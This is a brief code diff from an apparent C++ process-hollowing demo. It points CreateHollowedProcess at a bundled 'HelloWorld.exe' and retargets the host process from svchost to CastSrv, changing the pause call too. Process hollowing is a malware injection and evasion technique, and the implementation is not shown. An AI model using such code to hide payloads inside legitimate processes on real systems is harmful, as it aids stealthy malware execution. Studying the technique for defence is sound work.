@@ -291,15 +291,15 @@ int _tmain(int argc, _TCHAR* argv[])
 	char* pPath = new char[MAX_PATH];
 	GetModuleFileNameA(0, pPath, MAX_PATH);
 	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-	strcat(pPath, "helloworld.exe");
+	strcat(pPath, "HelloWorld.exe");
 	
 	CreateHollowedProcess
 	(
-		"svchost", 
+		"CastSrv",
 		pPath
 	);
 
-	system("pause");
+//	system("pause");
 
 	return 0;
 }
